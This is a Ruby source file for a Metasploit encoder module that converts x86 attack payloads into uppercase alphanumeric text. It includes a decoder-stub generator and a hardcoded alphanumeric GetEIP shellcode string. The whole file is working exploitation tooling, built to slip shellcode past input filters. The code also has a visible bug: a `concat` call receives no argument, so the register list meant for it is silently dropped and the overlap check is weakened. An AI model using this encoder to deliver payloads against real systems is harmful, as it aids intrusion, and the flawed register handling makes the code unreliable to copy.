# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/encoder/alpha2/alpha_upper'

class MetasploitModule < Msf::Encoder::Alphanum
  Rank = LowRanking

  def initialize
    super(
      'Name'             => "Alpha2 Alphanumeric Uppercase Encoder",
      'Description'      => %q(
        Encodes payloads as alphanumeric uppercase text.  This encoder uses
        SkyLined's Alpha2 encoding suite.
      ),
      'Author'           => [ 'pusscat', 'skylined' ],
      'Arch'             => ARCH_X86,
      'License'          => BSD_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::AlphanumUpper,
      'Decoder'          =>
        {
          'BlockSize' => 1
        })
  end

  #
  # Returns the decoder stub that is adjusted for the size of the buffer
  # being encoded.
  #
  def decoder_stub(state)
    modified_registers = []
    reg = datastore['BufferRegister']
    off = (datastore['BufferOffset'] || 0).to_i
    buf = ''

    # We need to create a GetEIP stub for the exploit
    if !reg
      if datastore['AllowWin32SEH'] && datastore['AllowWin32SEH'].to_s =~ /^(t|y|1)/i
        buf = 'VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816'
        reg = 'ECX'
        off = 0
        modified_registers.concat
        [
          Rex::Arch::X86::ESP,
          Rex::Arch::X86::EDI,
          Rex::Arch::X86::ESI,
          Rex::Arch::X86::EAX
        ]
      else
        res = Rex::Arch::X86.geteip_fpu(state.badchars, modified_registers)
        raise EncodingError, "Unable to generate geteip code" unless res
        buf, reg, off = res
      end
    else
      reg.upcase!
    end

    stub = buf + Rex::Encoder::Alpha2::AlphaUpper.gen_decoder(reg, off, modified_registers)

    # Sanity check that saved_registers doesn't overlap with modified_registers
    modified_registers.uniq!
    raise BadGenerateError unless (modified_registers & saved_registers).empty?

    stub
  end

  #
  # Encodes a one byte block with the current index of the length of the
  # payload.
  #
  def encode_block(state, block)
    Rex::Encoder::Alpha2::AlphaUpper.encode_byte(block.unpack('C')[0], state.badchars)
  end

  #
  # Tack on our terminator
  #
  def encode_end(state)
    state.encoded += Rex::Encoder::Alpha2::AlphaUpper.add_terminator
  end

  # Indicate that this module can preserve some registers
  def can_preserve_registers?
    true
  end

  # Convert the SaveRegisters to an array of x86 register constants
  def saved_registers
    Rex::Arch::X86.register_names_to_ids(datastore['SaveRegisters'])
  end
end
